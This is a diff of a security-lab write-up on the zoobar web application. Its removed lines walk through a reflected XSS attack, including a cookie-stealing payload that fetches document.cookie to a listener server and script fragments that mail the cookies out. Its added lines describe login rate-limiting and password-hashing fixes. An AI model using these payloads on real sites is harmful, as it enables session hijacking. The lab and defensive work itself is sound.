@@ -1,70 +1,61 @@
-# 3. Browser Protection
-## 3.1. Remote Execution - Reflected Cross-site Scripting 
+# 4. Fixing the Vulnerabilities
+___
+### following are few more vulnerabilities that I found in the zoobar application and how I fixed them
 
-The goal is to create a URL that, when accessed, will cause the victim's browser to execute some JavaScript you as the attacker has supplied.
-* When examining a URLs, there is one where the parameter is sent along with the URL, and then reflected back to the user view. 
-* The url is http://localhost:8080/zoobar/index.cgi/users?user=user_name
-* The user_name parameter is reflected back to the search box in the users page and its actually part of the value attribute of the input tag
-* By replacing the user_name with a javascript code, we can execute the javascript code in the victim's browser
-* The javascript code that will be executed is alert(document.cookie); which will pop up an alert box with the victim's cookies
-* in order to execute the javascript code, we need to escape the double quotes and the angle brackets.
-* The final url will be http://localhost:8080/zoobar/index.cgi/users?user=%22%3Cp%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E%3C/p%3E%22
-* this will translate to ``` "<p><script>alert(document.cookie);</script></p>" ``` which will be reflected and print the victim's cookies in an alert box
+#### 1. Login attempts are not limited:
+###### **vulnerability:**
+a Login attempts are not limited, so an attacker can try to brute force the password of a user
+###### **fix:** 
+limit the number of login attempts to 5 attempts per 2 minutes and block the user for 2 minutes if the user exceeded the limit
 
-### Following are screenshots of the attack:
-
-#### finding the reflected parameter:
-
-<img alt="image" src="https://user-images.githubusercontent.com/13490629/220351090-0779ae1b-2759-4572-a71c-edab7bb23eda.png" width="500"/>
-
-#### finding the dom element that affected by the reflected parameter:
-
-<img alt="image" height="500" src="https://user-images.githubusercontent.com/13490629/220351201-c61efa0b-17c8-4b2d-b61e-2cf8f8ff17aa.png"/>
-
-#### testing the attack:
-
-![image](https://user-images.githubusercontent.com/13490629/220351284-d2ba3c53-f03c-4e76-b878-cf627d515ef0.png)
-
-
-## 3.2. Steal Cookies
-* creating different url from previous attack, this making sure that the victim won't notice the attack
-```html
- <!-- original source -->
-<input type="text" name="user" value="{{ req_user }}" size=10></span><br>
-<!-- the final payload -->
-"size=10><script>fetch(`http://localhost:3000/cookie/${document.cookie}`)</script><input type="hidden
+```mermaid
+pie
+"Movies" : 80
+"TV shows" : 20
 ```
-* creating **"send_mail.sh"** shell script that will send the cookies to my mail
-```shell
-#!/bin/bash 
-.
-echo "Cookie value is: $1" | mail -s "$SUBJECT" "$TO"
-.
-.
-```
+###### **implementation:**
+* created new table in the database named failed_logins which store the number of login attempts and the time of the last login attempt for each user.
+<ul style="width: 80%; ">
+  <li>
+Add new table in the database named failed_logins which store the number of login attempts and the time of the last login attempt for each user.
+  </li>
+  <br>
+  <li>
+  Modify the "checkLogin" function in login.py file which check if the user exceeded the limit before actually trying to log in the user.
+  if the user exceeded the limit, the user will be blocked for 2 minutes and the user will be able to login again after 2 minutes.
+  if the user didn't exceed the limit, and the login failed, a new record will be added to the failed_logins table with the time of the 
+  last login attempt for the user 
+  if the user didn't exceed the limit, and the login succeeded, the records for the user will be deleted from the failed_logins table.
+  </li>
+</ul>
 
-* creating python server **"evil_server.py"** that will listen to the request and get the cookies as request parameter
-* the python server will execute the shell script and send the cookies to my mail
+
 ```python
-.
-server = HTTPServer((host, port), RequestHandler)
-.
-.
-cookie = os.path.basename(path).replace('cookie/', '')
-.
-.
-output = subprocess.check_output(['sh', 'send_mail.sh', cookie])
-.
-.
+    def checkLogin(self, username, password, blocking_duration_minutes=2, max_attempts=5):
+        now = datetime.now()
+        cred = Cred.get_by_username(username)
+        if cred is None:
+            return None
+        # Get all failed attempts that happened in the last blocking_duration_minutes minutes
+        attempts = FailedLogin.get_failed_attempts(cred, now, blocking_duration_minutes)
+        if len(attempts) >= max_attempts:  # Too many failed attempts
+            time_left = get_remaining_time(attempts, now, blocking_duration_minutes)
+            login_error = "Too many failed attempts. Try again in %s:%s" % (
+                time_left.seconds // 60, time_left.seconds % 60)
+            log(login_error)
+            return login_error
+        # Check credentials
+
+        token = auth_client.login(username, password)
+        if token is not None:  # Successful login
+            # Clear failed attempts
+            FailedLogin.delete_failed_attempts(attempts)
+            return self.loginCookie(username, token)
+        else:  # Failed login
+            FailedLogin.add_failed_attempt(cred)  # Log failure to failed attempts table
+            time.sleep(1)  # Sleep for 1 second to prevent brute force attacks
+            return None
 ```
-## 3.3. Protect, Fix the XSS Vulnerability
 
-* To fix the vulnerability, we need to escape the user input before printing it to the page using request.form.get() function
-* this way, the input will be escaped and won't reflect directly to the page
-* the line that need to be changed is in the **"users.html"** file
-```html
-- <!--<input type="text" name="user" value="{{ req_user }}" size=10></span><br>-->
-+ <input type="text" name="user" value="{{ request.form.get('user', '') }}" size=10></span><br>
-```
-
-
+#### 2. vulnerability: Passwords are not hashed:
+ Passwords are not hashed, so an attacker can get the password of a user by reading the database
